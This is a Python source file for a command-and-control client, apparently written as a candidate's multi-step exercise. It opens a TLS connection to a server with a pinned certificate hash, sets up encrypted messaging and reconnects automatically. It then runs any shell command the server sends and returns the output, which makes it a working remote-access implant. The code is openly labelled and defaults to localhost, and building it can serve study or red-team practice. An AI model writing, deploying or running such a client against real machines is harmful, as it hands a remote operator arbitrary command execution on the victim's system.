"""
C2 Client Implementation
Supports Steps 1-5 with modular design

Author: [Candidate]
References:
- AsyncIO patterns: https://stackoverflow.com/questions/48506460/python-simple-socket-client-server-using-asyncio
- Subprocess execution: https://docs.python.org/3/library/subprocess.html
"""

import asyncio
import logging
import time
import uuid
import os
import sys
import signal
import base64
import hashlib
import argparse
import subprocess
from typing import List
from models.message import Message
from models.send_receive_msgs import send_message, receive_message
from models.message_type import MessageType
from models.command_type import CommandType
from models.key_manager import KeyManager
from models.encryption_manager import EncryptionManager
from models.tls_helper import TLSSessionHelper

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
import base64

SUBPROCESS_TERMINATION_GRACE_TIME_S = 2

def get_spki_hash(der_cert_bytes: bytes) -> str:
    cert = x509.load_der_x509_certificate(der_cert_bytes)
    public_key = cert.public_key()
    spki_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    digest = hashes.Hash(hashes.SHA256())
    digest.update(spki_bytes)
    return base64.b64encode(digest.finalize()).decode("ascii")

def is_windows() -> bool:
    return 'win' in sys.platform

class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.key_manager = KeyManager()
        self._encryption_manager = None
        self.reader = None
        self.writer = None
        self.running = True
        self.command_queue = asyncio.Queue()
        self.shutdown_event = asyncio.Event()
        self.execution_process = None
    
    async def connect(self) -> bool:
        """
        Connect to C2 server and register
        """
        server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
        is_connected = False
        try:
            if not self.running:
                return False
            ssl_ctx = TLSSessionHelper().create_context(
                is_server=False,
            )
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port,
                ssl=ssl_ctx,
            )
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")

            ssl_obj = self.writer.get_extra_info("ssl_object")
            der_cert = ssl_obj.getpeercert(binary_form=True)
            server_sha_received = get_spki_hash(der_cert)
            if server_sha_received != server_sha:
                logger.error("Server certificate is not valid")
                await self._reset_writer_reader()
                return False

            # Send registration message with client's public key
            client_public_key = self.key_manager.serialized_public_key
            await self._send_register(self.client_id, client_public_key)
            
            # Receive acknowledgment with server's public key
            msg = await receive_message(self.reader)
            msg = Message.from_payload(msg)
            if msg and msg.type is MessageType.ACK:
                # Setup encryption with server's public key
                session_key = self.key_manager.compute_session_key(msg.command)
                self._encryption_manager = EncryptionManager(session_key)
                logger.info(f"Encryption established for client: {self.client_id}")
                logger.info(f"Registered as {msg.client_id}")
                is_connected = True
            else:
                logger.error("Registration failed")
        
        except ConnectionRefusedError:
            logger.error("Connection refused, server possibly down")
        except asyncio.CancelledError:
            logger.info("Connection attempt cancelled")
        except Exception as e:
            logger.error(f"Connection failed: {e}")
        finally:
            return is_connected
    
    async def reconnect_loop(self):
        """
        Auto-reconnect logic
        Attempts to reconnect every 1 second if disconnected
        """
        try:
            reconnect_delay = 1
        
            while self.running:
                if self.reader and self.writer:
                    logger.info('reader/writer exists - no reconnection needed')
                    return
                
                if await self.connect():
                    logger.info(f"Connected successfully {self.client_id}")
                    return
                
                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
                await asyncio.sleep(reconnect_delay)
            
        except asyncio.CancelledError:
            logger.info("Reconnect loop cancelled")
        except Exception as e:
            logger.error(f"Reconnect loop error: {e}")
            await self._reset_writer_reader()
    
    async def main_loop(self):
        """
        Main client loop
        """
        self.shutdown_event.clear()
        tasks = [
            asyncio.create_task(self._command_listener()),
            asyncio.create_task(self._command_processor()),
        ]
        tasks.append(
            asyncio.create_task(self._monitor(tasks))
        )
        
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            logger.info("Client main loop cancelled")
            self.running = False
        finally:
            logger.info("Client canceling tasks")
            await self._cancel_tasks(tasks)
            # Clear connection state
            await self._reset_writer_reader()
            logger.info('Main loop done')

    async def _reset_writer_reader(self):
        try:
            if self.writer and not self.writer.is_closing():
                self.writer.close()
                await self.writer.wait_closed()
        except Exception as e:
            logger.error(f"Error closing writer: {e}")
        finally:
            self.reader = None
            self.writer = None

    async def _monitor(self, tasks: List[asyncio.Task]):
        """
        Monitor connection health
        """
        try:
            await self.shutdown_event.wait()
            if not self.running:
                logger.info("Monitor caught termination event triggered")
            else:
                logger.info("Monitor caught reconnection event triggered")
            
        except asyncio.CancelledError:
            logger.info("Monitor cancelled")
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        finally:
            await self._cancel_tasks(tasks)
            await self._terminate_execution_process()

    @staticmethod
    async def _cancel_tasks(tasks: List[asyncio.Task]):
        try:
            for task in tasks:
                if not task.done():
                    task.cancel()
        except Exception as e:
            logger.error(f"Error cancelling tasks: {e}")
    
    async def _command_listener(self):
        """
        Listen for incoming commands from server
        """
        try:
            while self.running:
                msg = await receive_message(self.reader)

                # Connection closed
                if not msg:
                    logger.warning(f"Received an empty message")
                    break
                
                if not self._encryption_manager:
                    logger.error("Encryption not established")
                    break
                    
                msg = self._encryption_manager.decrypt(msg)
                if not msg:
                    logger.warning(f"Failed to decrypt message")
                    break
                
                if msg.type is MessageType.COMMAND:
                    if msg.command == CommandType.KILL.value:
                        logger.info("[_command_listener] Received kill command")
                        await self._terminate_execution_process()
                        self._drain_queue()
                    # Queue command for execution
                    await self.command_queue.put({
                        "cmd_id": msg.cmd_id,
                        "command": msg.command
                    })
                    logger.info(f"Received command: {msg.command}")
                else:
                    logger.warning(f"Unknown message type: {msg.type}")
        
        except asyncio.CancelledError:
            logger.info('command_listener cancelled')
        except asyncio.IncompleteReadError:
            logger.info(("Server" if self.running else "Client") + " closed connection")
            self.shutdown_event.set()
        except Exception as e:
            logger.error(f"Command listener error: {e}")

    def _drain_queue(self):
        # TODO: make global helper function
        try:
            while not self.command_queue.empty():
                cmd_data = self.command_queue.get_nowait()
                self.command_queue.task_done()
                logger.info(f"Drained command: {cmd_data.get('command', '')}")
            logger.info("Drained command queue")
        except asyncio.QueueEmpty:
            logger.info("Command queue is empty")
    
    async def _command_processor(self):
        """
        Execute commands from queue
        """
        try:
            while self.running:
                cmd_data = await self.command_queue.get()
                cmd_id = cmd_data.get("cmd_id")
                command = cmd_data.get("command", "").lower()
                
                if not self._encryption_manager:
                    logger.error("Encryption not established")
                    break
                
                logger.info(f"Executing: {command}")
                start_time = time.monotonic()
                result = await self._process_command(command)
                exec_time_ms = (time.monotonic() - start_time) * 1000
                
                # Send result back to server
                if await self._send_result(cmd_id, result, exec_time_ms):
                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
                else:
                    logger.debug("Failed to send result - connection lost")
                    break

                # Exit after sending kill result
                if not self.running:
                    return
            
        except asyncio.CancelledError:
            logger.info('command_processor cancelled')
        except Exception as e:
            logger.error(f"Command processor error: {e}")

    async def _process_command(self, command: str) -> str:
        if command == CommandType.KILL.value:
            result = self._process_kill_command()
        else:
            result = await self._execute_command(command)  # Run asynchronously with subprocess
        return result
    
    def _process_kill_command(self) -> str:
        """Process kill command"""
        logger.info("Processing kill command")
        self.running = False
        # Close reader to stop listener from reading
        if self.reader:
            self.reader.feed_eof()
        return "Client killed by server"
    
    async def _send_result(self, command_id: str, result: str, execution_time_ms: str) -> bool:
        msg = Message.as_result(command_id, result, execution_time_ms)
        msg = self._encryption_manager.encrypt(msg)
        return await send_message(
            self.writer,
            msg
        )

    async def _send_register(self, client_id: str, public_key: str) -> bool:
        """
        Send registration message to server
        """
        msg = Message.as_register(client_id, public_key)
        return await send_message(
            self.writer,
            msg.to_payload(True)
        )

    async def _execute_command(self, command: str) -> str:
        """
        Execute bash-style command
        Supports pipes, redirects, etc.
        """
        try:
            if is_windows():
                kwargs = {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
            else:
                kwargs = {"start_new_session": True}

            self.execution_process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **kwargs
            )
            
            # Combine stdout and stderr
            stdout, stderr = await self.execution_process.communicate()
            self.execution_process = None
            output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
            return output if output else "[No output]"
        except asyncio.CancelledError:
            await self._terminate_execution_process()
            raise            
        except subprocess.TimeoutExpired:
            return "[Command timed out after 30s]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    async def _terminate_execution_process(self):
        """Terminate execution process if it exists"""
        if not self.execution_process:
            return
        try:
            logger.info(f"Terminating execution process {self.execution_process.pid}")
            await self._terminate_subprocess_gracefully(self.execution_process)
            self.execution_process = None
        except asyncio.TimeoutError:
            logger.error("Terminating process timed out")
        except Exception as e:
            logger.error(f"Error terminating process: {e}")
        finally:
            if not self.execution_process:
                return
            await self._terminate_subprocess_forcefully(self.execution_process)

    @staticmethod
    async def _terminate_subprocess_gracefully(process: subprocess):
        """Terminate a subprocess gracefully"""
        if is_windows():
            process.send_signal(signal.CTRL_BREAK_EVENT)
        else:
            os.killpg(process.pid, signal.SIGTERM)
        await asyncio.wait_for(
            process.wait(),
            timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S
        )

    @staticmethod
    async def _terminate_subprocess_forcefully(process: subprocess):
        """Terminate a subprocess forcefully"""
        try:
            process.kill()
            await process.wait()
        except Exception as e:
            logger.error(f"Error forcefully killing process: {e}")
    
    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        
        # Start with reconnect loop - it handles both initial connection and reconnections
        try:
            while self.running:
                await self.reconnect_loop()
                if self.reader and self.writer:
                    await self.main_loop()
        except asyncio.CancelledError:
            logger.info("Client start cancelled")
        except Exception as e:
            logger.error(f"Client start error: {e}")
            await asyncio.sleep(1)  # Prevent tight loop on repeated failures

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.running = False

if __name__ == "__main__":
    asyncio.run(main())